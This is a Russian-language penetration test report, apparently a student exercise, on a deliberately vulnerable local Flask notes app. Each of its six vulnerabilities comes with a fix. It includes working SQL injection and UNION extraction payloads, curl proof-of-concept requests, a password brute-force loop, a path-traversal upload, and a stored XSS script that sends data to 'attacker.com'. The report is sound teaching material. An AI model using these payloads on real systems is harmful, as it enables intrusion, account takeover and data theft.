# Отчёт по тестированию безопасности — NoteVault

**Дата:** 2025  
**Объект тестирования:** Веб-приложение NoteVault (локальная среда)  
**Тестировщик:** [Имя студента]

---

## 1. Описание системы

**NoteVault** — веб-сервис для хранения личных заметок. Позволяет пользователям регистрироваться, создавать заметки с произвольным текстом и прикреплять к ним файлы.

**Стек:** Python 3, Flask, SQLite  
**Аутентификация:** Сессии Flask (cookie-based)  
**Хранилище:** SQLite (`notevault.db`), загружаемые файлы в папке `uploads/`

**Основные endpoint'ы:**


| GET/POST | `/login` | Вход |
| GET/POST | `/register` | Регистрация |
| GET | `/dashboard` | Список заметок + поиск |
| GET/POST | `/note/new` | Создать заметку |
| GET | `/note/<id>` | Просмотр заметки |
| POST | `/note/<id>/delete` | Удалить заметку |
| GET | `/uploads/<filename>` | Скачать вложение |

---

## 2. Найденные уязвимости

---

### VULN-01 · SQL Injection (Critical)

**Расположение:** `app.py`, маршруты `/login` (строка ~57) и `/dashboard` (строка ~86)

**Описание:**  
Пользовательский ввод конкатенируется напрямую в SQL-запрос без параметризации.

**Уязвимый код:**
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{hashed}'"
```

**Эксплуатация — обход авторизации:**  
В поле `username` ввести:
```
' OR '1'='1' --
```
Результирующий запрос:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'
```
Условие `'1'='1'` всегда истинно → вход под первым пользователем в БД без пароля.

**Эксплуатация — извлечение данных (поиск):**  
В поле поиска на дашборде ввести:
```
' UNION SELECT id,1,username,password,NULL FROM users --
```
В результатах появятся строки с именами и MD5-хешами паролей всех пользователей.

**PoC (curl):**
```bash
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=' OR '1'='1' --&password=anything"
# → редирект на /dashboard (вход выполнен)
```

**Критичность:** Critical — полный обход аутентификации и утечка всей БД.

**Исправление:**  
Использовать параметризованные запросы:
```python
user = db.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, hashed)
).fetchone()
```

---

### VULN-02 · IDOR — Insecure Direct Object Reference (High)

**Расположение:** `app.py`, маршруты `/note/<id>` и `/note/<id>/delete`

**Описание:**  
При просмотре и удалении заметки приложение не проверяет, принадлежит ли заметка текущему пользователю. Достаточно знать числовой `id`.

**Уязвимый код:**
```python
note = db.execute("SELECT * FROM notes WHERE id = ?", (note_id,)).fetchone()
# нет проверки note["user_id"] == session["user_id"]
```

**Эксплуатация:**  
1. Зарегистрировать двух пользователей: `alice` и `bob`.
2. Войти как `alice`, создать заметку → получить id (например, `1`).
3. Войти как `bob`, перейти на `http://localhost:5000/note/1` → заметка alice видна.
4. Отправить POST на `http://localhost:5000/note/1/delete` → заметка alice удалена.

**PoC:**
```bash
# Войти как bob, получить сессионную куку
curl -c bob.txt -X POST http://localhost:5000/login -d "username=bob&password=bob"
# Прочитать заметку alice (id=1)
curl -b bob.txt http://localhost:5000/note/1
```

**Критичность:** High — чтение и удаление данных любого пользователя.

**Исправление:**
```python
note = db.execute(
    "SELECT * FROM notes WHERE id = ? AND user_id = ?",
    (note_id, session["user_id"])
).fetchone()
if not note:
    return "Not found or access denied", 403
```

---

### VULN-03 · Слабое хеширование паролей (High)

**Расположение:** `app.py`, функции `register` и `login`

**Описание:**  
Пароли хранятся в виде MD5-хеша без соли. MD5 не является криптографически стойкой функцией для паролей: существуют радужные таблицы для большинства распространённых паролей, а скорость перебора на GPU составляет >10 миллиардов хешей в секунду.

**Уязвимый код:**
```python
hashed = hashlib.md5(password.encode()).hexdigest()
```

**Эксплуатация:**  
1. Получить хеши через SQLi (VULN-01) или прямой доступ к `notevault.db`.
2. Взломать хеши через hashcat или онлайн-сервис (crackstation.net):
```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 -a 0 - rockyou.txt
# → password
```

**Критичность:** High — компрометация паролей всех пользователей.

**Исправление:**  
Использовать bcrypt:
```python
from werkzeug.security import generate_password_hash, check_password_hash

# при регистрации
hashed = generate_password_hash(password)

# при логине
if user and check_password_hash(user["password"], password):
    ...
```

---

### VULN-04 · Stored XSS (High)

**Расположение:** `app.py` → `templates/view_note.html`

**Описание:**  
Содержимое заметки рендерится в шаблоне с фильтром `|safe`, что отключает автоматическое экранирование Jinja2. Вредоносный HTML/JS сохраняется в БД и выполняется в браузере каждого, кто открывает заметку.

**Уязвимый код (шаблон):**
```html
{{ note.content | safe }}
```

**Эксплуатация:**  
При создании заметки ввести в поле контента:
```html
<script>
  fetch('/dashboard').then(r=>r.text()).then(d=>{
    let notes = [...d.matchAll(/\/note\/(\d+)/g)].map(m=>m[1]);
    fetch('https://attacker.com/steal?ids='+notes.join(','));
  });
</script>
```
При открытии такой заметки любым пользователем скрипт выполнится в его браузере.

**Простой PoC:**
```
<script>alert('XSS: '+document.cookie)</script>
```

**Критичность:** High — выполнение произвольного JS в браузере жертвы, кража кук сессии.

**Исправление:**  
Убрать `|safe`, использовать автоэкранирование Jinja2:
```html
{{ note.content }}
```

---

### VULN-05 · Hardcoded Secret Key + No Rate Limiting (Medium)

**Расположение:** `app.py`, строка 11 и функция `login`

**A) Захардкоженный секрет сессии:**  
```python
app.secret_key = "supersecret123"
```
Flask подписывает сессионные cookie этим ключом. Зная ключ, атакующий может создать поддельный cookie с произвольным `user_id`:

```python
from flask.sessions import SecureCookieSessionInterface
from flask import Flask
app = Flask(__name__)
app.secret_key = "supersecret123"
# ... создать и подписать поддельную сессию с user_id=1
```

**B) Отсутствие rate limiting на `/login`:**  
Нет ограничений на количество попыток входа. Можно перебирать пароли скриптом:
```bash
for pass in $(cat rockyou.txt); do
  curl -s -X POST http://localhost:5000/login \
    -d "username=admin&password=$pass" | grep -q "dashboard" && echo "FOUND: $pass" && break
done
```

**Критичность:** Medium — подделка сессий при утечке кода, брутфорс паролей.

**Исправление:**
```python
import secrets
app.secret_key = secrets.token_hex(32)  # генерировать при запуске или хранить в .env

# Rate limiting — использовать flask-limiter:
from flask_limiter import Limiter
limiter = Limiter(app, default_limits=["5 per minute"])

@app.route("/login", methods=["GET", "POST"])
@limiter.limit("5 per minute")
def login(): ...
```

---

### VULN-06 · Path Traversal при загрузке файлов (Medium)

**Расположение:** `app.py`, функция `new_note`

**Описание:**  
Имя загружаемого файла не санируется. Атакующий может передать `../../app.py` как имя файла и перезаписать произвольный файл на сервере (или прочитать через `/uploads/../../app.py`).

**Уязвимый код:**
```python
filename = f.filename
f.save(os.path.join(UPLOAD_FOLDER, filename))
```

**Эксплуатация:**
```bash
curl -b cookies.txt -X POST http://localhost:5000/note/new \
  -F "title=test" -F "content=x" \
  -F "file=@evil.txt;filename=../../app.py"
# app.py будет перезаписан содержимым evil.txt
```

**Критичность:** Medium — перезапись файлов сервера, потенциально RCE.

**Исправление:**
```python
from werkzeug.utils import secure_filename
filename = secure_filename(f.filename)
if filename:
    f.save(os.path.join(UPLOAD_FOLDER, filename))
```

---

## 3. Сводная таблица уязвимостей

| # | Уязвимость | Класс | Критичность | Исправлено |
|---|-----------|-------|-------------|------------|
| 1 | SQL Injection (login + search) | Injection | Critical | ✅ |
| 2 | IDOR (просмотр/удаление чужих заметок) | Broken Access Control | High | ✅ |
| 3 | Слабый хеш паролей (MD5) | Cryptographic Failure | High | ✅ |
| 4 | Stored XSS | Injection | High | ✅ |
| 5 | Hardcoded secret + No rate limiting | Misconfiguration / Auth | Medium | ✅ |
| 6 | Path Traversal (файловая загрузка) | Injection | Medium | ✅ |

---

## 4. Выводы

Приложение NoteVault в исходном (`vulnerable`) варианте содержит критические уязвимости, позволяющие:
- Войти в систему без знания пароля (SQLi)
- Прочитать и удалить данные любого пользователя (IDOR)
- Выполнить произвольный JavaScript в браузере другого пользователя (XSS)
- Получить все пароли пользователей и взломать их (MD5 + SQLi)

Все уязвимости характерны для OWASP Top 10 и устраняются стандартными практиками: параметризованные запросы, проверка прав доступа, современные алгоритмы хеширования, экранирование вывода, валидация входных данных.

**Инструменты, использованные при тестировании:** curl, встроенные инструменты браузера (DevTools), hashcat, ручной анализ кода.
